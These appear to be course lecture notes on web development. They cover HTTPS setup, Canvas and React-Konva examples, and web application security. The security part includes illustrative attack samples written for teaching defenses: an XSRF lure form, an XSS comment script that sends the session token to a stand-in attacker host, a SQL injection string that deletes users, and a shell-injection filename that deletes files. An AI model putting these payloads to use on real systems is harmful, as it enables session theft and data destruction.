
## Project Overview

 - You're building an app.
 - You're producing a video presentation, posted to the public
   internet.
 - The last two lectures will be used for Q&A on the
   presentations. There are about 20 teams, so we'll need to watch
   about 10 presentations (~ 2 hours) *before* each Q&A lecture.
 - That's in addition to HW10, but that should be a pretty quick
   non-programming assignment.
 - Which team's presentations go with which lectures will be posted
   on Sunday after the deadline.
 - The Q&A lecture meetings themselves will probably run short, since
   we're unlikey to have 10 minutes of questions per presentation.
 - You are expected to attend the presentation lectures.

## Extra Credit Thing

 - You get an opportunity to resubmit a HW.

## Project Questions

...


## The Rest of the Semester

That leaves us five more lectures. They'll mostly be bonus topics, except
for the lecture a week from today which is the setup for HW10.

 - Today: Security, 2D Canvas
 - Friday: WASM, 3D Canvas
 - Tue Apr 06: Guest Lecture on Privacy Policies (= HW10)
 - Fri Apr 09: Distributed Elixir
 - Tue Apr 13: Semester Summary
 - Fri Apr 16: Presentation Q&A (Required)
 - Tue Apr 20: Presentation Q&A (Required)

# Topic 1: HTTPS

First, we're going to set up some webapps for HTTPS.

To do this, we'll use Certbot: 

 - https://letsencrypt.org/
 - Get started
 - With shell access
 - Certbot
 - My website is running Nginx on Debian 10
 - Snap is lame. Let's do better.
 - Operating system packages.
 - Oh look, it's just in the repos as "certbot".
 - Just run it? 

# Topic 2: The Canvas API

 - Normal HTML + CSS is the default way describe the visual content of a web page.
 - That gives us:
   - A dynamic layout made out of rectangles.
   - Dynamic text.
   - Dynamic selection of static images.
 - That's good enough for a wide variety of applications, including some games
   as we saw in the first project.
 - For some applications we'd rather be able to draw arbitrary things on the
   screen.
 - For that, HTML provides the Canvas API.
 - Canvas lets us chose between two basic modes: 2D and 3D
   - This gives us access to a vector drawing API similar to SVG files.
   - webgl2 - This lets us do hardware accelerated 3D graphics.
   
## Basic Canvas

 - Type 2d-canvas.html
 - This shows a way to use the canvas 2D API. There are other approaches.

## React Konva Example

```
$ npx create-react-app shapes
$ cd shapes
shapes$ npm install react-konva konva lodash
```

Minimal React-Konva example, in App.js:

```
import { Stage, Layer, Circle } from 'react-konva';

function App() {
  return (
    <div>
      <Stage width={1024} height={768}>
        <Layer>
          <Circle radius={20} x={100} y={100} fill="red" />
        </Layer>
      </Stage>
    </div>
  );
}

export default App;
```

Extend it to bouncing balls:

```
import { useState, useEffect } from 'react';
import { Stage, Layer, Circle } from 'react-konva';
import _ from 'lodash';

let W = 1024;
let H = 768;
let R = 50;
let G = 2;

let state0 = {
  balls: [
    {x: 100, y: 700, dx: 0, dy: -1},
    {x: 200, y: 650, dx: 0, dy: -1},
    {x: 300, y: 750, dx: 0, dy: -1},
  ],
};

let on_tick = null;

function App() {
  const [state, setState] = useState(state0);

  function tick() {
    let balls = _.map(state.balls, ({x, y, dx, dy}) => {
      if (y + dy < R/2) {
        dy = -dy;
      }
      else {
        dy -= G;
      }
      y += dy;
      return {x, y, dx, dy};
    });
    setState(_.assign({}, state, {balls}));
  }

  useEffect(() => {
    on_tick = tick;
  });

  let circles = _.map(state.balls, (bb, ii) => (
    <Circle key={ii} radius={R} x={bb.x} y={H - bb.y} fill="red" />
  ));

  return (
    <div>
      <Stage width={W} height={H}>
        <Layer>
          {circles}
        </Layer>
      </Stage>
    </div>
  );
}

setInterval(() => {
  if (on_tick) {
    on_tick();
  }
}, 100);

export default App;
```

Now add an onClick event:

```
  // in the loop in tick
  if ((x + dx < R / 2) || (x + dx > W - (R/2))) {
    dx = -dx;
  }
  x += dx;
   
  // new function
  function push(bb) {
    let balls = _.map(state.balls, (ball, ii) =>
      (ii == bb ? _.assign({}, ball, {dx: ball.dx + 10}) : ball));
    setState(_.assign({}, state, {balls}));
  }


  // in render
  <Circle key={ii} radius={R} x={bb.x} y={H - bb.y} fill="red"
          onClick={() => push(ii)} />);
```

# Topic 3: Web Application Security

## Big Picture

Your Server is on the Public Internet

 - Whenever you have a machine connected to a public network, you're exposing a
   public API to the world.
 - Anyone can send you arbitrary IP packets.
 - It's up to you to make sure that sending you IP packets will only let people
   do stuff that you intended to let them do.
 - For example, if you expose a /delete_db route that deletes your database,
   your database is going to get deleted.

Law: In the United States, the computer fraud and abuse act makes some network
requests potentially illegal.

 - As someone running a server, this is basically irrelevent to you.
 - Not only will people ignore the law, they may be in a country with
   different laws.
 - It's best to assume that people will take advantage of the full
   API that you are factually exposing.
   
### Web-App Security: First Steps

 - The server must be secure *outside* of the web application.
 - You should know what your request routing infrastructure (e.g. nginx) does
   with all requests: handle it directy, forward it to your app, etc.
 - If your server has multiple externally accessible services all of them
   need to be secure.

Keep in mind that security is, to some extent, binary. Either your entire system
is secure or it's not.

## Who Are Potential Attackers

### Random unregistered people

What can they do?

 - Can do non-HTTP requests
 - Can do HTTP requests to routes that don't require some sort
   of session validation.

What should they be able to do?

 - Log in or register
 - Access public pages

What shouldn't they be able to do?

 - Access any information that's restricted to log-in users.
 - Do *anything* that wasn't explicitly intended as an action
   allowed to unauthenticated users.
   
### Registered Users

What can they do?

 - Anything an non-registered user can do.
 - Access routes that require an authenticated user session.

What should they be able to do?

 - Access stuff intended for all logged in users.
 - Access information about their own account.

What shouldn't they be able to do?

 - Access private information about other accounts.
 - Access stuff intended for users with special permissions,
   such as moderation tools, administrative interfaces, or
   development / debugging tools.

### Users with Special Roles

What can they do?

 - Anything a normal registered user can do.
 - Access whatever additional stuff the program lets them access
   due to their role.

What should they be able to do?

 - Whatever tasks are specific to their role.

What shouldn't they be able to do?

 - Access stuff intended for users with other special roles. For example,
   a moderator probably shouldn't be able to change their own role to
   become a site administrator.
 - Access development / debugging tools unless that's specifically
   intended behavior for their role.

### Developers / Sysops

What can they do?

 - Probably whatever they want, including deploying new modified versions of the
   app.

What should they be able to do?

 - Any task nessisary to maintain the deployed application.

What shouldn't they be able to do?

 - It's possible come up with application designs where the intent is that
   developers don't have access to some user data.
 - For example, WhatsApp advertizes end-to-end encryption. WhatsApp developers
   *shouldn't* be able to access user's private messages.
 - Actually building applications that restrict developer capabilities in the
   face of developers who can deploy arbitrary application updates is somewhere
   between impossible and extremely difficult.

## Your app should enforce its own rules

Your app nessisarily has rules about what users are allowed to do and what they
can't.

Let's consider a simple Twitter clone for a moment.

 - A user can send a tweet.
   - That tweet will be labeled as being sent by that user.
   - A user *can't* send a tweet marked as coming from someone
     else's account.
 - A user can delete their own tweet.
   - They can't delete someone else's tweet.
 - A user can retweet an existing tweet.
   - What happens if the origional tweet is deleted?

It's up to you as the developer to:

 - Figure out what your application's access rules are.
 - Enforce them.

Rules *must* be enforced in server-side code.

 - We've talked about this a lot, but it's worth repeating.
 - Here's the simplest case: You have an "/admin" path that shows
   the admin UI.
 - The link to "/admin" is only shown to logged-in admins.
 - But people can just type "/admin" into their browser.
 - We still need to check, on the server, that requests to that
   path come someone with an active session that marks them as
   an admin.

You can also check rules in client-side JS - a common example is form
validation - but this is purely a user experience thing. The actual code that
validates your inputs and verifies permissions can only happen on the server.

## Possible issue: Resource Enumeration

 - A user logs into your site.
 - They follow a link to their profile page: /users/219
 - From the URL, they can derive the following information:
 - They are user #219
 - Going to some other user number might get them someone
   else's profile page, (e.g. /users/218 should be the previous
   user)
 - User #1 is frequently an admin. They can get their at /users/1

Is this a security vulnerability?

 - Probably not.
 - You should be enforcing your rules about who can access what, so if the user
   types in a URL they don't have permission to access they get an error.

Alternative: Use UUIDs for identifiers, specifically to make your
identifiers opaque.

 - Advantage: You can hide how many users you have.
 - Advantage: Users can't simply guess other valid identifiers.
 - Advantage: UUIDs let you do neat stuff like distributed 
   unsynchronized inserts, depending on your data storage setup.
 - Disadvantage: URLs get long and impossible to remember.
 - Disadvantage: UUIDs are a little more complicated to deal with
   and a little slower (although it probaby doesn't matter) than
   simple numeric IDs.

Key idea: URLs are part of your application UI. They are exposed to
and manipulatable by users due to the basic archetecture of the web. It's better
to embrace this than try to avoid it.

## Libraries can have security issues

 - Your app has a bunch of dependencies.
 - Your dependencies each have other dependencies.
 - Lens depends on, directly or indirectly:
   - Elixir and the Erlang VM
   - 26 external Elixir packages.
   - Whatever browser we visit it with.
   - 625 external JS packages.
   - The OS it's running on and any OS packages.
   - My class VPS has 839 Debian packages installed.
 - Any of these dependencies can have security bugs.

Generally we trust our OS and included packages. Most OS vendors are pretty
serious about security and do an OK job, although there are edge cases like the
Arch Linux AUR where the packages shouldn't be trusted.

In any case, I'm going to assume the OS is fine and focus on the explicit
dependencies of an app.

For many applications, it's reasonably safe to simply:

 - Trust your dependencies.
 - Regularly update them when you update your app.

To get a bit more secure, you can explicitly watch for security issues.

 - Run "npm audit" regularly.
 - 


If you want to be more serious about security issues, things get difficult.

 - *Any one* of your dependencies can break your app security.
 - These dependencies are maintained by third party developers.
 - Those developers can *intentionally* add security holes or arbitrary
   malicious code to their packages whenever they want to.
 - Those developers can have their accounts hijacked, and the hijacker
   can push new versions with malicious code.

The only really serious approach to dependency security is to internalize
all your dependencies.

 - Get your app working with specific versions of all your deps.
 - Either commit your dependencies to your application git repository or set up
   a local package repository that you can use with tools like npm or mix.
 - Manually audit every dependency to make sure there are no security holes
   or security *risks* in the code.
 - When new versions come out don't update, instead manually backport security
   fixes and essential new fetures to the version you already have.
 - Make sure nobody ever types "npm install" or "npm update" again without
   repeating the full audit-and-pinning process.
 - This is a possible thing to do, and it becomes much easier if you minimize
   the number of dependencies you have.

Unfortunately, the JavaScript ecosystem is a problem.

http://npm.anvaka.com/#/view/2d/webpack

Just using webpack means pulling in 340 dependencies with 255 maintainers. And
this issue of malicious maintainers isn't theoretical - there have been several
cases of malicious NPM packages deep in dependency graphs, including one that
stole bitcoins.

I don't have a good solution for this problem, except to suggest that for
security critical applications you avoid the standard JavaScript ecosystem
entirely, and even consider not using a language-specific package manager at
all.

# Specific Attacks

## XSRF: Cross Site Request Forgery

Imagine that the president of France has a web interface to launch nuclear
missles.

```
<!-- web page at https://nukes.fr/ -->
<h1>Launch Nuclear Missles</h1>
<form action="/launch" method="post">
    <select name="target">
       <option>London</option>
       <option>Moscow</option>
       <option>Ottowa</option>
       <option>Washington</option>
    </select>
    <input type="submit" value="Launch">
</form>
```

To launch missles:

 * Log in with username and password.
 * Select the target from the drop down. 
 * Click the submit button to POST the form.

What happens if we build a website like this?

```
<!-- web page at https://haxxor.fi/ -->
<h1>Find Cute Pictures</h1>
<form action="https://nukes.fr/launch" method="post">
  <select name="target">
    <option value="Ottowa">Kittens</option>
    <option value="Ottowa">Puppies</option>
  </select>
  <input type="submit" value="Search">
</form>

<!-- optional -->
<script>
    // on load submit form
</script>
```

The president gets a session cookie when he logs into the nukes website.
Assuming he uses the same browser window to visit our cute pictures website,
when he submits the cute pictures form, he's already authenticated.

This is an XSRF attack, and defending against it is well understood:

```
<form action="/launch" method="post">
    <input type="hidden" name="_xsrf_token" value="security token">
    <select name="target">
```

The security token (probalby something like a Phoenix.Token) is generated
when rendering the form, and an attacker can't guess it. This restricts form
submissions to the legitimate form on the actual site rather than fake forms on
other sites.

Frameworks like Phoenix do this for us automatically when we use
helpers like < %= form_for % >.


## XSS: Cross-Site Scripting

Imagine you're building some application that allows user comments.

 - A user enters their comment.
 - Other users visit the site see the comment.

To show the comment, you need to render the text the user entered as part of
your web page.

What if the user enters this comment?

```
<script>
    fetch('http://haxor.fi/save?token=' + window.session_token).then(...);
</script>

Great product! A++++
```

If you insert that text directly into the web page, every user views the page
will have the script run, and then our dastardly Finnish hacker has all our
session tokens and can impersonate other users.

This attack vector was used to create self-replicating comments on both MySpace
and Twitter.

Web frameworks like Phoenix try to protect you from this by automatically
escaping any text you include in your pages, but this is worth considering
whenever you accept and display user inputs.

Allowing people to input HTML for text formatting is especially difficult, since
*any* HTML tag can include JavaScript in several ways.

```
<p onMouseOver="...">Great Product. A++++</p>
```

In general, we don't want to allow *anyone* to inject arbitrary HTML content
into our pages. This can be user comments, but another common case is
advertisements. A standard mechanism for displaying ads is to request HTML
and/or JavaScript fragments and embed them in the web page. This allows the ad
provider to perform an XSS attack.


## In browser JavaScript security

JavaScript code running in the user's browser is less controllable than server
side code - the user can control it as well - but that code can still manage
secrets like the user's session token. We give that information to the user, and
the user can do whatever they want with it.

But that secret is still a secret between us and that user. We don't want it to
leak to third parties.

JavaScript code running in the user's browser when visiting our site also has a
level of access that random code running elsewhere doesn't have. It can perform
HTTP requests to our site without worrying about cross-site origin rules.

So our JS code still needs to have security properties:

 - We need to avoid XSS issues as described above.
 - We need to make sure that we don't leak user secrets to third party sites.

For example, if we have a authentication token in our local state, we shouldn't
post our entire local state to an external API.

## SQL Injection

A common bug, especially in old PHP code, was to construct SQL queries as
follows:

```
<?php
    $query = "select * from users where name = \"" + $_POST['name] + "\";";
    $user = $mysql->query($query);
```

What happens when a user enters the follwing into the name field:

```
"; delete * from users; select "hello
```

Unfortunately, they delete all our users.

Modern database libraries avoid this problem by using parameterized queries
rather than string concatenation. Rather than having a "query" API that just
takes an SQL string, they have an API like this:

```
    $mysql->fixed_query("select * from users where name = ?;", [$name]);
```

The database library will use the string directly as the query rather than
treating it as a fragment of SQL code.

Using a library like Ecto to build queries avoids this problem entirely, so most
modern applications require developers to go out of their way to write this bug,
but it's still a mistake you can make if you try to build queries manually.

## Untrusted input in general

It's not just SQL databases that are subject to injection attacks. Consider an
application that lets you upload files and then deletes them by running a shell
command:

```
def delete(conn, %{"filename" => filename}) do
    System.cmd("rm /tmp/files/#{path}")
end
```

Here we have an even simpler attack. Enter "foo.txt ~ -rf" and this code deletes
the whole user directory for our application.

The moral of the story is this:

 - If you got data from a user, that data is untrusted.
 - Don't use that data for *anything* without carefully validating it first.
 - Especially don't execute it as code.

Perl has a neat mechanism for this called "tainting". Any value had an
associated "taint" flag that you would set on any user input. Any dervied value
(e.g. by string concatination or building a data structure) would keep the taint
flag. Attempts to call functions that wanted trusted data (e.g. database
queries, shell commands) would throw an exception. You could mark data as
untainted once you validated it.

Phoenix's safe HTML mechanism is kind of the opposite. 

## Denial of Service

There are different levels of bad when it comes to security holes:

 - RCE flaws allow attackers run arbitrary code on our servers.
 - Some security holes let attackers modify private data.
 - Others let attackers access private data.
 - But simply preventing users from accessing our application will cause us
   trouble too.

Attacks that prevent our application from working are called Denial of Service
attacks.

It's difficult to defend against these attacks in general. Attackers with a lot
of bandwidth (or a botnet) can simply send us so much traffic that it saturates
our network connection. There are ways to avoid this, but they are network
management techniques rather than stuff we do with our application.

If you need to worry about traffic based DOS attacks such as classic DDOS,
you'll want to get a DDOS protection service from some network provider.

But flaws in our application can make this sort of attack much easier.

For example, if every request to a certain path causes us to emit 100k of text
to a log file and we never clean up the log file, our server will eventually run
out of disk space. If an attacker knows about this issue, they can send a lot of
requests and make it happen in a couple hours.

If we tune our password hashing algorithm to take 5 seconds of CPU time to
verify a password, an attacker can simply send us one login attempt per second
per CPU and we'll have a really hard time doing anything but rejecting bad
passwords.

There are three basic steps to take to defend against these kind of attacks:

 - First, we should avoid doing a lot of work or using up a lot of resources for
   simple requests. This ends up being the same as performance tuning, just we
   need to worry about it sooner when considering DOS attacks.
 - Second, we should make sure we clean up after ourselves. Rotating log files
   and limiting user file uploads / cleaning up old files is nesissary for
   reliability anyway, but DOS attacks mean we shouldn't delay these
   considerations.
 - Finally, we need to explicitly build our applications to stop these attacks.
   We should detect excess requests and simply block potential attackers. For
   example, we should only allow K login requests per source IP per hour and not
   even try to validate requests beyond the limit.

# Security Tools

Not all bugs are security bugs, but some are. Regular bug / style scanning tools
("linters") can help.

 - https://github.com/rrrene/credo
 - https://github.com/babel/babel-eslint
 - https://github.com/mre/awesome-static-analysis
 - https://deepscan.io/

Tools explicitly for security issues:

 - https://elixircasts.io/detect-security-issues-with-sobelow

Using these tools, or even more complex (potentially pay-to-use) tools you may
find doesn't guarantee that your code is OK. But it may help catch bugs, and is
therefore worth trying.


